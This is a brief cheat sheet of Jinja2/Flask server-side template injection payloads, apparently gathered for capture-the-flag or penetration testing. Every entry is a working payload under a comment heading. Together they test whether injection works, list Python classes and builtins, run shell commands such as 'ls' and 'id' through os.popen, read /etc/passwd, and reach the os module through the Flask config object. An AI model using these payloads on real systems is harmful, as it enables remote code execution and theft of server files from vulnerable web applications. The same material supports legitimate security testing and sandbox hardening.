# TESTING INJECTION CAPABILITIES
{{7*'7'}}

# ALL AVAILABLE CLASSES
{{ "".__class__.__mro__[1].__subclasses__() }}

# SEE PERMISIONS ON THE DIRECTORIES
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen("ls -lah").read() }}

# SEE BUILTINS
{{ self.__init__.__globals__.__builtins__ }}

# READ ETC/PASSWD
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}

# READ ALL DIRECTORIES IN / PARTITION
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen("ls /").read() }}

# INFO ON THE USER
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# SEE CONFIG FILES OF THE DOCKER
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

